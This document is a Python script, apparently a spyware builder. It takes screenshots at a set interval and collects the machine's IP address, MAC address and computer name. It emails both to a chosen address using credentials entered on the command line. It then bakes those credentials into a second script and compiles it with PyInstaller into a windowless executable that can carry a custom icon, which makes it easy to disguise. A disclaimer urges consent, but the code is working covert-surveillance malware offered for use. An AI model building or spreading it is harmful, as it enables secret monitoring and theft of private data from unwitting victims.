# Screenshot Tool
# Developed by: ugurcomptech
# License: Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License

# WARNING: This tool can potentially be misused for malicious purposes and may lead to
# unauthorized access to other people's important data. Use it responsibly and only with
# the consent of the recipient for legitimate purposes.

# Disclaimer: The developer is not responsible for any misuse or damage caused by this tool.

import os
import yagmail
import argparse
import socket
import uuid
import time
from PIL import ImageGrab

def get_system_info():
    ip_address = socket.gethostbyname(socket.gethostname())
    mac_address = ':'.join(hex(uuid.getnode())[i:i+2] for i in range(2, 14, 2))
    computer_name = socket.gethostname()
    return f"IP Address: {ip_address}\nMAC Address: {mac_address}\nComputer Name: {computer_name}"

def capture_screenshot(file_name):
    screenshot = ImageGrab.grab()
    screenshot.save(file_name)

def send_email(subject, message, attachment_path, sender_email, receiver_email, sender_password):
    try:
        yag = yagmail.SMTP(sender_email, sender_password)
        yag.send(
            to=receiver_email,
            subject=subject,
            contents=message,
            attachments=attachment_path,
        )
        yag.close()
        print(f"Email sent successfully to {receiver_email}.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Capture and send screenshots via email.")
    parser.add_argument("-s", "--sender-email", required=True, help="Sender's email address.")
    parser.add_argument("-p", "--sender-password", required=True, help="Sender's email password.")
    parser.add_argument("-r", "--receiver-email", required=True, help="Recipient's email address.")
    parser.add_argument("-i", "--interval", type=int, required=True, help="Interval in seconds between screenshots.")
    parser.add_argument("-n", "--exe-name", required=True, help="The name of the generated exe file.")
    parser.add_argument("-c", "--icon-path", help="Path to the icon file for the executable.")
    
    args = parser.parse_args()

    screenshots_folder =  os.path.join(os.environ['USERPROFILE'], 'Documents')
    
    if not os.path.exists(screenshots_folder):
        os.mkdir(screenshots_folder)

    counter = 1
    try:
        while True:
            file_name = os.path.join(screenshots_folder, f"screenshot{counter}.png")
            capture_screenshot(file_name)

            subject = f"Screenshot {counter}"
            message = f"Screenshot {counter} captured and sent as an attachment.\n\nSystem Information:\n{get_system_info()}"
            send_email(subject, message, file_name, args.sender_email, args.receiver_email, args.sender_password)

            print(f"Screenshot {counter} captured and sent.")
            
            # Screenshot gönderildikten sonra dosyayı sil
            os.remove(file_name)
            
            counter += 1
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("Screenshot capturing stopped by user.")

            
    # Embed the code into the exe file
    embedded_code = f'''
import os
import yagmail
import socket
import uuid
import time
from PIL import ImageGrab

def get_system_info():
    ip_address = socket.gethostbyname(socket.gethostname())
    mac_address = ':'.join(hex(uuid.getnode())[i:i+2] for i in range(2, 14, 2))
    computer_name = socket.gethostname()
    return f"IP Address: {{ip_address}}\\nMAC Address: {{mac_address}}\\nComputer Name: {{computer_name}}"

def capture_screenshot(file_name):
    screenshot = ImageGrab.grab()
    screenshot.save(file_name)

def send_email(subject, message, attachment_path, sender_email, receiver_email, sender_password):
    try:
        yag = yagmail.SMTP(sender_email, sender_password)
        yag.send(
            to=receiver_email,
            subject=subject,
            contents=message,
            attachments=attachment_path,
        )
        yag.close()
        print(f"Email sent successfully to {{receiver_email}}.")
    except Exception as e:
        print(f"An error occurred: {{e}}")

if __name__ == "__main__":
    screenshots_folder =  os.path.join(os.environ['USERPROFILE'], 'Documents')
    
    if not os.path.exists(screenshots_folder):
        os.mkdir(screenshots_folder)

    counter = 1  # Burada counter değişkeni sabit bir değerle başlatılıyor
    try:
        while True:
            file_name = os.path.join(screenshots_folder, f"screenshot{counter}.png")
            capture_screenshot(file_name)

            subject = f"Screenshot {counter}"
            message = f"Screenshot {counter} captured and sent as an attachment.\\n\\nSystem Information:\\n{{get_system_info()}}"
            send_email(subject, message, file_name, "{args.sender_email}", "{args.receiver_email}", "{args.sender_password}")

            print(f"Screenshot {counter} captured and sent.")
            counter += 1
            time.sleep({args.interval})
    except KeyboardInterrupt:
        print("Screenshot capturing stopped by user.")

        
    '''
    
    # Write the embedded code to the exe file
    with open(args.exe_name + ".py", "w", encoding="utf-8") as exe_file:
        exe_file.write(embedded_code)

    # Create the exe file with the specified icon if provided
    pyinstaller_cmd = f"pyinstaller --onefile --noconsole {args.exe_name}.py"
    if args.icon_path:
        pyinstaller_cmd += f" --icon={args.icon_path}"

    os.system(pyinstaller_cmd)

    print(f"'{args.exe_name}.exe' file is created and code is embedded.")
